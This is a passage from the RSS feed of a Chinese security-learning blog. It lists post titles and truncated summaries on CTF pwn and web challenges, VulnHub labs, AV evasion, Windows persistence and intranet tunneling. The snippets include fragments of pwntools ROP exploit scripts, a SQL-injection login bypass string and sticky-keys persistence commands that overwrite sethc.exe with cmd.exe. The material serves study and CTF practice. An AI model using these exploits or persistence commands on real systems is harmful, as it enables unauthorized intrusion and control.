      <description>[toc] 1.YARA简介 YARA 是一个旨在（但不限于）帮助恶意软件研究人员识别和分类恶意软件样本的开源工具。 YARA的每一条描述、规则都由一系列字符串和一个布尔型表达式构成，并阐述其逻辑。YARA规则可以与文件或在运行的进程，以帮助研究人员识别其是否属</description>
    </item>
    <item>
      <title>RC4</title>
      <link>http://ghostasky.github.io/posts/rc4/</link>
      <pubDate>Wed, 27 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/rc4/</guid>
      <description>hw摸鱼，闲的没啥事干，把RC4的加解密原理写一遍吧，明天干别的东西。（hw期间电脑装了dlp，，就不截图了） RC4，对称加密算法，流加密，秘钥长度可变。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。 RC4加解密时依次以字节流的方式加解密明文中的每一</description>
    </item>
    <item>
      <title>HW日记</title>
      <link>http://ghostasky.github.io/posts/2022-hw/</link>
      <pubDate>Mon, 25 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-hw/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>java_URL链分析</title>
      <link>http://ghostasky.github.io/posts/javasec-url/</link>
      <pubDate>Fri, 22 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/javasec-url/</guid>
      <description>java安全的东西在github仓库里写了一点，正好放假了，在博客里再重新写一遍，，感觉忘的差不多了。 [toc] URLDNS URLDNS为ysoserial的一个利用链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅</description>
    </item>
    <item>
      <title>XV6阅读笔记</title>
      <link>http://ghostasky.github.io/posts/xv6/</link>
      <pubDate>Tue, 12 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/xv6/</guid>
      <description>[toc] 英文版：https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf 中文版：http://xv6.dgs.zone/ Chapter 1:Operating system interfaces xv6 是 MIT 开发的一个教学用的完整的类 Unix 操作系统，并且在 MIT</description>
    </item>
    <item>
      <title>关于读研or就业，还有理想</title>
      <link>http://ghostasky.github.io/posts/2022-7-12/</link>
      <pubDate>Tue, 12 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-7-12/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>MIT6S081lab</title>
      <link>http://ghostasky.github.io/posts/2022-7-10-oslab/</link>
      <pubDate>Sun, 10 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-7-10-oslab/</guid>
      <description>写oslab的一些代码， xv6中文文档：https://th0ar.gitbooks.io/xv6-chinese/content/content/chapter2.html [toc] 进度 进度： lab_num/lab_name Is it completed Lab1/sleep Finish Lab1/pingpong Finish Lab1/prime Finish Lab1/find Lab1/xargs Lab2/trace Finish Lab2/sysinfo Finish Lab3/vmprint Finish 环境 之前搞到一半，</description>
    </item>
    <item>
      <title>MIT6.S081_Note</title>
      <link>http://ghostasky.github.io/posts/6.s081/</link>
      <pubDate>Thu, 07 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/6.s081/</guid>
      <description>[toc] 6.s081看的是文档（比较快些），没看视频，：https://github.com/Ghostasky/MIT6.S081 XV6:https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf 有一说一，这课是真他娘好看，就按照章节顺序来做笔记吧。 上次没看完，，，这个暑假搞完，，，， Chapter1 6.s081 操作系统的目标： 抽</description>
    </item>
    <item>
      <title>BypassAVDynamics[译]</title>
      <link>http://ghostasky.github.io/posts/2022-6-29-bypassavdynamics/</link>
      <pubDate>Sat, 02 Jul 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2022-6-29-bypassavdynamics/</guid>
      <description>本文译的是《BypassAVDynamics》，也不能算译文，主要写自己读完之后学到的东西 好久之前的文章了，vt应该查杀挺多的，没测试 need read： PE注入 这个应该写过，win32那里&amp;hellip; [toc] 简介 绕过AV的两大步骤： 恶意代码的隐藏，</description>
    </item>
    <item>
      <title>重拾Win32</title>
      <link>http://ghostasky.github.io/posts/%E9%87%8D%E6%8B%BEwin32/</link>
      <pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E9%87%8D%E6%8B%BEwin32/</guid>
      <description>之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！ [toc] 介绍 Win32不是用来画界面的，如果你以后要在Windows写好程序，是必须要学Win32的； 字符编码 ASCII 使用指定的7 位二进制数组合来表示</description>
    </item>
    <item>
      <title>Spring MVC初探</title>
      <link>http://ghostasky.github.io/posts/springmvc%E5%88%9D%E6%8E%A2/</link>
      <pubDate>Thu, 31 Mar 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/springmvc%E5%88%9D%E6%8E%A2/</guid>
      <description>最近想看看java，不知道从哪开始，。。正好spring有最近不太平，就从spring MVC开始看吧。 [toc] 开篇 &amp;ldquo;静态&amp;quot;与&amp;quot;动态&amp;rdquo;，这两个词最大的不同就是在于其交互性。动态页面却可以实现根据用户的要求</description>
    </item>
    <item>
      <title>VulnHub_04_Holynix: v1</title>
      <link>http://ghostasky.github.io/posts/vulnhub04/</link>
      <pubDate>Mon, 28 Mar 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/vulnhub04/</guid>
      <description>download：vulnhub nmap扫一下：192.168.188.138 Nmap scan report for 192.168.188.138 Host is up (0.0015s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch) MAC Address: 00:0C:29:BC:05:DE (VMware) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.24 - 2.6.25 Network Distance: 1 hop 万能密码：1&#39; or 1=1#登陆， upload的时候应该是说</description>
    </item>
    <item>
      <title>dompdf 0day(RCE)复现</title>
      <link>http://ghostasky.github.io/posts/dompdf/</link>
      <pubDate>Sat, 19 Mar 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/dompdf/</guid>
      <description>这次的漏洞是dompdf这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。 最开始这个漏洞并不是rce，而是xss。 首先是两个配置： 在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。 /** * Enable embedded PHP * * If this setting is set to true then DOMPDF will automatically evaluate</description>
    </item>
    <item>
      <title>内网渗透&amp;横向移动&amp;····</title>
      <link>http://ghostasky.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</link>
      <pubDate>Sat, 19 Mar 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</guid>
      <description>GitHub：https://github.com/Ghostasky/IntranetPenetrationLearn 给个star吧QAQ [toc] 1.名词解释 工作组、域、域控制器（DC）、父域、子域、域树、域森林、活动目录（AD）、DMZ、域内</description>
    </item>
    <item>
      <title>Windows权限维持学习</title>
      <link>http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Tue, 08 Mar 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/</guid>
      <description>[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 屏幕键盘： C:\Windows\System32\osk.exe 放大镜： C:\Windows\System32\Magnify.exe 旁白： C:\Windows\System32\Narrator.exe 显示切换器 C:\Windows\System32\DisplaySwitch.exe 应用切换器： C:\Windows\System32\AtBroker.exe 直接命令行： copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe 高版本需要IFEO。所谓的IFEO就是Image File Execution Options，直译过来</description>
    </item>
    <item>
      <title>Nodejs原型链污染</title>
      <link>http://ghostasky.github.io/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</link>
      <pubDate>Tue, 01 Mar 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</guid>
      <description>[toc] NodeJs基础 好像也没啥写的。。 child_process(创建子进程) 分为异步和同步： 异步： child_process.exec(command[, options][, callback]) child_process.execFile(file[, args][, options][, callback]) child_process.fork(modulePath[, args][, options]) child_process.spawn(command[, args][, options]) 同步： child_process.execFileSync(file[, args][, options]) child_process.execSync(command[, options]) child_process.spawnSync(command[, args][, options]) 异步中，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的</description>
    </item>
    <item>
      <title>VulnHub_03_LAMPSECURITY: CTF7</title>
      <link>http://ghostasky.github.io/posts/vulnhub03/</link>
      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/vulnhub03/</guid>
      <description>download：https://www.vulnhub.com/entry/lampsecurity-ctf7,86/ 找到ip为：192.168.188.132 nmap参数： -Pn ：不检测主机存活 ┌──(root💀kali)-[/home/k</description>
    </item>
    <item>
      <title>VulnHub_02_LAMPSECURITY: CTF5</title>
      <link>http://ghostasky.github.io/posts/vulnhub02/</link>
      <pubDate>Thu, 17 Feb 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/vulnhub02/</guid>
      <description>download:https://www.vulnhub.com/entry/lampsecurity-ctf5,84/ 扫描之后发现是：http://192.168.188.131 nmap -sV &amp;lt; 要扫描的目标ip地址&amp;gt;* ┌──(root💀kali)-[/home/kali] └─# nmap -sV 192.168.188.131 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 01:26 EST Nmap scan report for 192.168.188.131 Host is up (0.0059s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7 (protocol 2.0)</description>
    </item>
    <item>
      <title>VulnHub_01_LAMPSECURITY: CTF4</title>
      <link>http://ghostasky.github.io/posts/vulnhub01/</link>
      <pubDate>Wed, 16 Feb 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/vulnhub01/</guid>
      <description>开始打vulnhub download：https://www.vulnhub.com/entry/lampsecurity-ctf4,83/ 扫描： netdiscover nmap -sT -sV -O 192.168.188.0/24 发现为192.168.188.130 nmap扫下： nmap -A :检测操作系统和服务 ┌──(</description>
    </item>
    <item>
      <title>内网渗透-隧道隐藏</title>
      <link>http://ghostasky.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</link>
      <pubDate>Thu, 10 Feb 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</guid>
      <description>[toc] 隐藏通信隧道技术 当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。 在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议</description>
    </item>
    <item>
      <title>2021年终总结</title>
      <link>http://ghostasky.github.io/posts/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sat, 05 Feb 2022 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/2021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
    </item>
    <item>
      <title>陇原战疫杯2021部分WP</title>
      <link>http://ghostasky.github.io/posts/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/</link>
      <pubDate>Mon, 15 Nov 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/</guid>
      <description>[toc] 都是赛后写的，wtcl。 还是学到了很多。 PWN bbbaby 思路： 有canary，使用sub_40086C覆盖canary为puts绕过 之后就是泄露libc，写rop链就好 先看下保护，只开了canary： gwt@ubuntu:~/Desktop$ checksec pwn1 [*] &amp;#39;/home/gwt/Desktop/pwn1&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) main __int64 __fastcall main(__int64 a1,</description>
    </item>
    <item>
      <title>BUU_RE刷题</title>
      <link>http://ghostasky.github.io/posts/buu-re-0x01-0x1f/</link>
      <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-re-0x01-0x1f/</guid>
      <description>之前写过一部分re的题解，最近又有点想搞re了，重来吧。(从01开始计) 0x01.简单注册器 简单的替换和翻转字符串 x = &amp;#34;dd2940c04462b4dd7c450528835cca15&amp;#34; x = list(x) x[2] = chr((ord(x[2]) + ord(x[3])) - 50) x[4] = chr((ord(x[2]) + ord(x[5])) - 48) x[30] = chr((ord(x[31]) + ord(x[9])) - 48) x[14] = chr((ord(x[27]) + ord(x[28])) - 97) x = x[::-1] x = &amp;#39;&amp;#39;.join(x) print(x) 0x02.Java逆向解密 代码逻辑很清晰 package defpackage;</description>
    </item>
    <item>
      <title>再战PE结构</title>
      <link>http://ghostasky.github.io/posts/pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</link>
      <pubDate>Sat, 23 Oct 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</guid>
      <description>[toc] PE文件结构解析 0.总述 大致结构如下： DOS头（占位），仅适用于映像文件 DOS存根（又叫签名），仅适用于映像文件 COFF文件头，适用于映像文件和目标文件 NT（可选文件头），仅适用于映像文件 节表（节区头） 节 其中，PE头包含DOS头、DOS存</description>
    </item>
    <item>
      <title>BUU_PWN刷题_0x40-0x4F</title>
      <link>http://ghostasky.github.io/posts/buu-pwn-0x40-0x4f/</link>
      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-pwn-0x40-0x4f/</guid>
      <description>[TOC] 0x40.ciscn_2019_s_9 看下检查,全没开 yutao@ubuntu:~/Desktop$ checksec ./ciscn_s_9 [*] &amp;#39;/home/yutao/Desktop/ciscn_s_9&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments int pwn() { char s[24]; // [esp+8h] [ebp-20h] BYREF puts(&amp;#34;\nHey! ^_^&amp;#34;); puts(&amp;#34;\nIt&amp;#39;s nice to meet you&amp;#34;); puts(&amp;#34;\nDo you have anything to tell?&amp;#34;); puts(&amp;#34;&amp;gt;&amp;#34;); fflush(stdout); fgets(s, 50, stdin); puts(&amp;#34;OK bye~&amp;#34;); fflush(stdout); return 1; } 有可用的gadget： .text:08048551 hint proc near .text:08048551 ; __unwind { .text:08048551 push ebp .text:08048552 mov ebp, esp .text:08048554 jmp esp .text:08048554 hint endp 直接写shellcode的话会太长，那么</description>
    </item>
    <item>
      <title>PHP反序列化整理</title>
      <link>http://ghostasky.github.io/posts/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/</link>
      <pubDate>Tue, 05 Oct 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/</guid>
      <description>[toc] 1.反序列化 Demo: &amp;lt;?php class test { private $flag = &amp;#34;flag{233}&amp;#34;; protected $ccc = &amp;#34;ccc&amp;#34;; public $a = &amp;#34;aaa&amp;#34;; static $b = &amp;#34;bbb&amp;#34;; } $test = new test; $data = serialize($test); echo $data; ?&amp;gt; out: O:4:&amp;#34;test&amp;#34;:3:{s:10:&amp;#34;testflag&amp;#34;;s:9:&amp;#34;flag{233}&amp;#34;;s:6:&amp;#34;*ccc&amp;#34;;s:3:&amp;#34;ccc&amp;#34;;s:1:&amp;#34;a&amp;#34;;s:3:&amp;#34;aaa&amp;#34;;} 注意这里testflag长度为8，但序列化的显示确是10，可以抓包一下： 可以看到其实类名的前后有不可见字符，其实就是%00，这是因为flag是private，</description>
    </item>
    <item>
      <title>IO_FILE调试&#43;详解</title>
      <link>http://ghostasky.github.io/posts/io_file/</link>
      <pubDate>Fri, 24 Sep 2021 23:09:51 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/io_file/</guid>
      <description>[TOC] 开始干__IO_FILE。会依次调fopen,fwrite,fread之类的IO函数的源码。 IO_FILE之fopen详解 demo程序 ##include&amp;lt;stdio.h&amp;gt; int main() { FILE*fp=fopen(&amp;#34;test&amp;#34;,&amp;#34;wb&amp;#34;); char *ptr=malloc(0x20); return 0; } 源码分析 跟进去之后可以看到fopen实际是_IO_new_fopen函数。它调用的是</description>
    </item>
    <item>
      <title>BUU_WEB刷题_0x30-0x3F</title>
      <link>http://ghostasky.github.io/posts/buu-web-0x30-0x3f/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-web-0x30-0x3f/</guid>
      <description>[toc] 0x30.[WUSTCTF2020]朴实无华(审计) robots找到个文件fAke_f1agggg.php，假的flag，查看头，找到fl4g.php。 &amp;lt;?php header(&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET[&amp;#39;num&amp;#39;])){ $num = $_GET[&amp;#39;num&amp;#39;]; if(intval($num) &amp;lt; 2020 &amp;amp;&amp;amp; intval($num + 1) &amp;gt; 2021){ echo &amp;#34;我不经意间看了看我的劳力士, 不是想</description>
    </item>
    <item>
      <title>BUU_WEB刷题_0x20-0x2F</title>
      <link>http://ghostasky.github.io/posts/buu-web-0x20-0x2f/</link>
      <pubDate>Sun, 12 Sep 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-web-0x20-0x2f/</guid>
      <description>[toc] 0x20.[GXYCTF2019]禁止套娃 考点是无参数RCE先贴两个链接： https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE http://www.heetian.com/info/827 找了半天没发现啥，看wp说是git泄露，然后 ┌──(kali㉿kali)-[~/GitHack] └─$ python GitHack.py http://25ced3f5-75c8-4ac6-9d2c-9097371101ca.node4.buuoj.cn:81/ [+] Download and parse index file ... error: Not a Git index file ┌──(kali㉿kali</description>
    </item>
    <item>
      <title>Tcache_stashing_unlink_atack调试记录</title>
      <link>http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</link>
      <pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</guid>
      <description>代码是how2heap中libc2.27的代码 ##include &amp;lt;stdio.h&amp;gt; ##include &amp;lt;stdlib.h&amp;gt; ##include &amp;lt;assert.h&amp;gt; int main(){ unsigned long stack_var[0x10] = {0}; unsigned long *chunk_lis[0x10] = {0}; unsigned long *target; setbuf(stdout, NULL); printf(&amp;#34;This file demonstrates the stashing unlink attack on tcache.\n\n&amp;#34;); printf(&amp;#34;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&amp;#34;); printf(&amp;#34;This technique can be used when you are able to overwrite the victim-&amp;gt;bk pointer. Besides, it&amp;#39;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&amp;#34;); printf(&amp;#34;The mechanism of putting smallbin into tcache in glibc gives us a chance to</description>
    </item>
    <item>
      <title>PWN刷题小结</title>
      <link>http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sun, 08 Aug 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</guid>
      <description>[toc] 1.杂 Ubuntu 18下偶尔会发生栈无法对齐的情况，多retn几次就好了。 strlen()函数来判断输入的长度，遇到&#39;\x00&#39;时会终止，而gets()函数遇到&#39;\x00&#39;并不会截断 sys,write,puts,printf system(&amp;quot;/binsh&amp;quot;) p32(e.plt[&amp;#39;system&amp;#39;]) + p32(0xdeadbeef) + p32(sh_addr) p64(pop_rdi_ret) + p64(sh_addr) + p64(e.sym[&amp;#39;system&amp;#39;]) p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_plt) + p64(0xdeadbeef) write:输出，read（</description>
    </item>
    <item>
      <title>BUU_PWN刷题_0x30-0x3F</title>
      <link>http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/</link>
      <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/</guid>
      <description>[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp+0h] [ebp-88h] BYREF printf(&amp;#34;What&amp;#39;s this:%p?\n&amp;#34;, buf); return read(0, buf, 0x100u); } tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&amp;#39;debug&amp;#39;) io = process(&amp;#34;./level1&amp;#34;) ##io = remote(&amp;#34;node4.buuoj.cn&amp;#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload +=(0x88+4-len(asm(shellcraft.sh())))*&amp;#39;a&amp;#39; + p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive() 只能ret2libc了： from pwn import * context(log_level=&amp;#39;debug&amp;#39;) ##io = process(&amp;#34;./level1&amp;#34;) elf = ELF(&amp;#34;./level1&amp;#34;) libc = ELF(&amp;#34;./libc-2.23.so&amp;#34;) io = remote(&amp;#34;node4.buuoj.cn&amp;#34;,29905) payload = (0x88+4)*&amp;#39;a&amp;#39; + p32(elf.plt[&amp;#39;write&amp;#39;])+p32(elf.sym[&amp;#39;main&amp;#39;])+p32(1)+p32(elf.got[&amp;#39;read&amp;#39;])+p32(4) io.sendline(payload) read = u32(io.recv(4)) base = read - libc.sym[&amp;#39;read&amp;#39;] system_add = base</description>
    </item>
    <item>
      <title>BUU_PWN刷题_0x21-0x2F</title>
      <link>http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/</link>
      <pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/</guid>
      <description>[TOC] 0x20.jarvisoj_level3_x64 ret2libc from pwn import * context(log_level=&amp;#39;debug&amp;#39;) ##io = process(&amp;#34;./level3_x64&amp;#34;) io = remote(&amp;#34;node3.buuoj.cn&amp;#34;,29779) elf = ELF(&amp;#34;./level3_x64&amp;#34;) libc = ELF(&amp;#34;./libc-x64-2.23.so&amp;#34;) write_plt = elf.plt[&amp;#39;write&amp;#39;] read_got = elf.got[&amp;#39;read&amp;#39;] main_addr = elf.sym[&amp;#39;main&amp;#39;] pop_rdi_ret = 0x4006b3 pop_rsi_r15_ret = 0x4006b1 io.recv() payload = &amp;#39;a&amp;#39;*(0x88)+ p64(pop_rdi_ret)+p64(1) payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(8)+p64(write_plt)+ p64(main_addr) io.sendline(payload) read_add = u64(io.recv()[0:8]) print hex(read_add) base = read_add - libc.symbols[&amp;#34;read&amp;#34;] sys_add = base + libc.symbols[&amp;#34;system&amp;#34;] bin_sh = base + libc.search(&amp;#34;/bin/sh&amp;#34;).next() payload = &amp;#39;a&amp;#39;*(0x88)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr) io.sendline(payload) io.interactive() 0x21.picoctf_2018_rop chain win1(): void win_function1() { win1 = 1; } win2(): int __cdecl win_function2(int a1) { int result; // eax result = (unsigned __int8)win1; if ( win1 &amp;amp;&amp;amp; a1 == 0xBAAAAAAD ) { win2 = 1; } else if ( win1 ) { result = puts(&amp;#34;Wrong Argument. Try Again.&amp;#34;);</description>
    </item>
    <item>
      <title>BUU_PWN刷题_0x01-0x0F</title>
      <link>http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/</link>
      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/</guid>
      <description>0x1.test_your_nc nc一下就完事。 0x2.rip checksec： yutao@pwnbaby:~/Desktop$ checksec pwn1 [*] &amp;#39;/home/yutao/Desktop/pwn1&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments ida打开，有个后门函数：fun() 双击s到stack of main，15字节，exp： from pwn import * io = process(&amp;#34;./pwn1&amp;#34;) payload = &amp;#39;a&amp;#39;*(0xf + 8) + p64(0x40118a) ##具体86还是87/8a要看linux</description>
    </item>
    <item>
      <title>BUU_PWN刷题_0x10-0x1F</title>
      <link>http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/</link>
      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/</guid>
      <description>[TOC] 0x10.[HarekazeCTF2019]baby_rop 没后门函数： int __cdecl main(int argc, const char **argv, const char **envp) { char v4[16]; // [rsp+0h] [rbp-10h] BYREF system(&amp;#34;echo -n \&amp;#34;What&amp;#39;s your name? \&amp;#34;&amp;#34;); __isoc99_scanf(&amp;#34;%s&amp;#34;, v4); printf(&amp;#34;Welcome to the Pwn World, %s!\n&amp;#34;, v4); return 0; } from pwn import * context(log_level=&amp;#39;DEBUG&amp;#39;) ##io = process(&amp;#34;./babyrop&amp;#34;) io = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28280) elf = ELF(&amp;#39;./babyrop&amp;#39;) io.recv() sys_plt = elf.plt[&amp;#34;system&amp;#34;] pop_rdi_ret =0x0400683 bin_sh = 0x0601048 payload = &amp;#39;a&amp;#39;*0x18+ p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)+p64(0xdeadbeef) io.sendline(payload) io.interactive() 0x11.jarvisoj_level2_x64 ssize_t vulnerable_function() { char buf[128]; // [rsp+0h] [rbp-80h] BYREF system(&amp;#34;echo Input:&amp;#34;); return read(0, buf, 0x200uLL); } 有/bin/sh字符串，没啥写的。 from pwn import * ##io = process(&amp;#34;./level2_x64&amp;#34;) io = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28783) elf = ELF(&amp;#34;./level2_x64&amp;#34;) io.recv()</description>
    </item>
    <item>
      <title>BUU_WEB刷题_0x10-0x1F</title>
      <link>http://ghostasky.github.io/posts/buu-web-0x10-0x1f/</link>
      <pubDate>Mon, 03 May 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
      <guid>http://ghostasky.github.io/posts/buu-web-0x10-0x1f/</guid>
